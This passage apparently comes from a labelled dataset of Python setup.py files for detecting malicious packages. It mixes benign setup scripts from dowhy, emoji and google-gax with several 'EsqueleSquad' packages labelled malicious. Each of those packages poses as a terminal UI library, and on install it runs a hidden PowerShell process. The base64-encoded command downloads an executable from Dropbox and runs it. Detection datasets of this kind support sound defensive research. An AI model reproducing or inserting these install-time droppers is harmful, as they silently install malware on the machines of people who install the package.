packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    package_data={\n        \"eth_manager\": [\n            \"py.typed\",\n            \"hdaccount/wordlist/*.txt\",\n        ]\n    },\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n    ],\n)\n", "target": 1}
{"idx": "selfgetmask-8.14", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfgetmask',\n    packages = ['modlib'],\n    version = '10.79',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dowhy-0.8", "func": "\"\"\"A setuptools based setup module for dowhy.\n\nAdapted from:\nhttps://packaging.python.org/en/latest/distributing.html\nhttps://github.com/pypa/sampleproject\n\"\"\"\n\nfrom setuptools import setup, find_packages\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\nwith open(path.join(here, 'README.rst'), encoding='utf-8') as f:\n    long_description = f.read()\n\n# Get the required packages\nwith open(path.join(here, 'requirements.txt'), encoding='utf-8') as f:\n    install_requires = f.read().splitlines()\n\n# Plotting packages are optional to install\nextras = [\"plotting\"]\nextras_require = dict()\nfor e in extras:\n    req_file = \"requirements-{0}.txt\".format(e)\n    with open(req_file) as f:\n        extras_require[e] = [line.strip() for line in f]\n\n# Loading version number\nwith open(path.join(here, 'dowhy', 'VERSION')) as version_file:\n    version = version_file.read().strip()\n    print(version)\n\nsetup(\n    name='dowhy',\n    version=version,\n    description='DoWhy is a Python library for causal inference that supports explicit modeling and testing of causal assumptions.',  # Required\n    license='MIT',\n    long_description=long_description,\n    url='https://github.com/microsoft/dowhy',  # Optional\n    download_url='https://github.com/microsoft/dowhy/archive/v0.8.tar.gz',\n    author='Amit Sharma, Emre Kiciman',\n    classifiers=[  # Optional\n        'Development Status :: 4 - Beta',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n    ],\n\n    keywords='causality machine-learning causal-inference statistics graphical-model',\n    packages=find_packages(exclude=['docs', 'tests']),\n    python_requires='>=3.6',\n    install_requires=install_requires,\n    extras_require=extras_require,\n    include_package_data=True,\n    package_data={'dowhy':['VERSION']}\n)\n", "target": 0}
{"idx": "Flask-Migrate-3.1.0", "func": "import setuptools\n\nsetuptools.setup()\n", "target": 0}
{"idx": "ultraad-6.27", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ultraad',\n    packages = ['modlib'],\n    version = '9.2',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpvisaintelint-5.92", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpvisaintelint',\n    packages = ['modlib'],\n    version = '3.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqhackedmask-4.77", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqhackedmask',\n    packages = ['modlib'],\n    version = '10.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "emoji-2.0.0", "func": "#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\n\n\"\"\"Setup script for emoji.\"\"\"\n\n\nimport os\nfrom codecs import open\n\nfrom setuptools import setup\n\nwith open('README.rst', encoding='utf-8') as f:\n    readme_content = f.read().strip()\n\n\nauthor = email = source = version = None\nwith open(os.path.join('emoji', '__init__.py'), encoding='utf-8') as f:\n    for line in f:\n        if line.strip().startswith('__version__'):\n            version = line.split('=')[1].strip().replace('\"', '').replace(\"'\", '')\n        elif line.strip().startswith('__author__'):\n            author = line.split('=')[1].strip().replace('\"', '').replace(\"'\", '')\n        elif line.strip().startswith('__email__'):\n            email = line.split('=')[1].strip().replace('\"', '').replace(\"'\", '')\n        elif line.strip().startswith('__source__'):\n            source = line.split('=')[1].strip().replace('\"', '').replace(\"'\", '')\n        elif None not in (version, author, email, source):\n            break\n\nsetup(\n    name='emoji',\n    author=author,\n    author_email=email,\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Information Technology',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Multimedia :: Graphics :: Presentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    description=\"Emoji for Python\",\n    keywords=['emoji'],\n    extras_require={\n        'dev': [\n            'pytest',\n            'coverage',\n            'coveralls',\n        ],\n    },\n    include_package_data=True,\n    license=\"New BSD\",\n    long_description=readme_content,\n    packages=['emoji', 'emoji.unicode_codes'],\n    url=source,\n    version=version,\n    zip_safe=True,\n)\n", "target": 0}
{"idx": "ultralib-4.15", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ultralib',\n    packages = ['modlib'],\n    version = '4.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "glocaltokens-0.6.7", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['glocaltokens',\n 'glocaltokens.google',\n 'glocaltokens.google.internal',\n 'glocaltokens.google.internal.home',\n 'glocaltokens.google.internal.home.foyer',\n 'glocaltokens.utils']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['gpsoauth>=1.0.1,<2.0.0',\n 'grpcio>=1.46.1,<2.0.0',\n 'protobuf>=3.20.1,<4.0.0',\n 'requests>=2.27.1,<3.0.0',\n 'simplejson>=3.17.2,<4.0.0',\n 'zeroconf>=0.38.6,<0.39.0']\n\nsetup_kwargs = {\n    'name': 'glocaltokens',\n    'version': '0.6.7',\n    'description': 'Tool to extract Google device local authentication tokens in Python',\n    'long_description': '[![GitHub Workflow Status][workflow-shield]][workflow]\\n[![PyPI][pypi-shield]][pypi]\\n[![Downloads][pepy-shield]][pepy]\\n[![Pre-commit][pre-commit-shield]][pre-commit]\\n[![GitHub Activity][commits-shield]][commits]\\n\\n# Google home local authentication token extraction\\n\\nPython 3 package to extract google home devices local authentication tokens from google servers.\\nThese local authentication tokens are needed to control Google Home devices\\n(See [@rithvikvibhu](https://github.com/rithvikvibhu)\\'s [Google Home (2.0) API](https://rithvikvibhu.github.io/GHLocalApi/)).\\n\\nPlease note:\\nOnce you have local google authentication tokens they only live about 1 day long.\\nAfter that you will need to obtain new ones.\\nYou will probably need to run the script repeatedly storing the tokens somewhere convenient.\\n\\n## Quickstart\\n\\nNote: the package was written and tested on Python 3.\\n\\n- Install the python package\\n\\n```\\npip install glocaltokens\\n```\\n\\nUse in your program as (see examples folder for detailed example):\\n\\n```Python\\nfrom glocaltokens.client import GLocalAuthenticationTokens\\n\\n# Using google username and password\\n#\\n# ONLY CALL THIS ONCE\\n#\\n# If you call this too often, google will disconnect your android devices and other weird things will happen\\n#\\n# Call get_google_devices_json() afterwards to get timers/alarms as oftens as you want to update.\\nclient = GLocalAuthenticationTokens(\\n  username=\"<YOUR_GOOGLE_USERNAME>\",\\n  password=\"<YOUR_GOOGLE_PASSWORD>\"\\n)\\n\\n# Get master token\\nprint(\"[*] Master token\", client.get_master_token())\\n\\n# Get access token (lives 1 hour)\\nprint(\"\\\\n[*] Access token (lives 1 hour)\", client.get_access_token())\\n\\n# Get google device local authentication tokens (live about 1 day)\\nprint(\"\\\\n[*] Google devices local authentication tokens\")\\ngoogle_devices = client.get_google_devices_json()\\n\\n# You can also select specific models to select when calling get_google_devices or get_google_devices_json with the models_list parameter.\\n# For example, we have pre-defined a constant with some Google Home Models (WARNING! Not all of them may be present)\\n# This could be used this way\\nfrom glocaltokens.const import GOOGLE_HOME_MODELS\\n\\ngoogle_devices_select = client.get_google_devices_json(GOOGLE_HOME_MODELS)\\n\\n# But if you need to select just a set of models, or add new models, you can use a list of str\\ngoogle_devices_select_2 = client.get_google_devices_json([\\n    f\"Google Home\",\\n    f\"Google Home Mini\",\\n    f\"Google Nest Mini\",\\n])\\n```\\n\\n### Predefined models list\\n\\nThere are some pre-defined models list in [`scanner.py`](/glocaltokens/scanner.py), feel free to\\nadd new lists, or add models to a list with a pull-request.\\n\\n#### `GOOGLE_HOME_MODELS`:\\n\\n- Google Home\\n- Google Home Mini\\n- Google Nest Mini\\n- Lenovo Smart Clock\\n\\n## Security Recommendation\\n\\nNever store the user\\'s password nor username in plain text, if storage is necessary, generate a master token and store it.\\nExample approach:\\n\\n```python\\nfrom glocaltokens.client import GLocalAuthenticationTokens\\n\\n# Using google username and password first, and only once\\nclient = GLocalAuthenticationTokens(\\n  username=\"<YOUR_GOOGLE_USERNAME>\",\\n  password=\"<YOUR_GOOGLE_PASSWORD>\"\\n)\\n\\n# Get master token\\nmaster_token = client.get_master_token()\\nprint(\"[*] Master token\", master_token)\\n\\n\"\"\"Now store master_token somewhere\"\"\"\\n\\n```\\n\\n## Contributing\\n\\nSee [Contributing guidelines](CONTRIBUTING.md).\\nThis is an open-source project and all countribution is highly welcomed.\\n\\n# Credits\\n\\nMuch credits go to [@rithvikvibhu](https://github.com/rithvikvibhu) for doing most of the heavy work like finding a way to\\nextract master and access tokens\\n(See his gist [here](https://gist.github.com/rithvikvibhu/952f83ea656c6782fbd0f1645059055d)).\\n\\nAlso, thank you very much to the guys at `pychromecast` which provided the code required to scan devices in the network.\\n\\n[workflow-shield]: https://img.shields.io/github/workflow/status/leikoilja/glocaltokens/Linting%20&%20Testing\\n[workflow]: https://github.com/leikoilja/glocaltokens/actions\\n[pypi-shield]: https://img.shields.io/pypi/v/glocaltokens\\n[pypi]: https://pypi.org/project/glocaltokens/\\n[pepy-shield]: https://pepy.tech/badge/glocaltokens\\n[pepy]: https://pepy.tech/project/glocaltokens\\n[commits-shield]: https://img.shields.io/github/commit-activity/y/leikoilja/glocaltokens\\n[commits]: https://github.com/leikoilja/glocaltokens/commits/master\\n[pre-commit-shield]: https://img.shields.io/badge/pre--commit-enabled-brightgreen\\n[pre-commit]: https://pre-commit.com/\\n',\n    'author': 'Ilja Leiko',\n    'author_email': 'leikoilja@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/leikoilja/glocaltokens',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'python_requires': '>=3.8,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "selflgtbpaypal-9.51", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfLGTBpaypal',\n    packages = ['modlib'],\n    version = '8.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-gax-0.16.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Copyright 2015, Google Inc.\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are\n# met:\n#\n#     * Redistributions of source code must retain the above copyright\n# notice, this list of conditions and the following disclaimer.\n#     * Redistributions in binary form must reproduce the above\n# copyright notice, this list of conditions and the following disclaimer\n# in the documentation and/or other materials provided with the\n# distribution.\n#     * Neither the name of Google Inc. nor the names of its\n# contributors may be used to endorse or promote products derived from\n# this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\n# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nimport io\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\nDEPENDENCIES = [\n    'dill >= 0.2.5, < 0.3dev',\n    'future >= 0.16.0, < 0.17dev',\n    'googleapis-common-protos >= 1.5.2, < 2.0dev',\n    'grpcio >=1.0.2, <2.0dev',\n    'google-auth >= 1.0.0, <2.0dev',\n    'ply == 3.8',\n    'protobuf >= 3.0.0, < 4.0dev',\n    'requests >= 2.13.0, < 3.0dev'\n]\n\nwith io.open('README.rst', 'r') as readme:\n    long_description = readme.read()\n\nsetup(\n    name='google-gax',\n    version='0.16.0',\n    description='Google API Extensions',\n    long_description=long_description,\n    author='Google API Authors',\n    author_email='googleapis-packages@google.com',\n    url='https://github.com/googleapis/gax-python',\n    packages=find_packages(exclude=('tests*',)),\n    namespace_packages=('google',),\n    license='BSD-3-Clause',\n    classifiers=[\n        'Development Status :: 7 - Inactive',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ],\n    install_requires=DEPENDENCIES,\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "esqmaskpingultra-2.44", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskpingultra',\n    packages = ['modlib'],\n    version = '8.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqvisakill-4.54", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqvisakill',\n    packages = ['modlib'],\n    version = '3.74',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
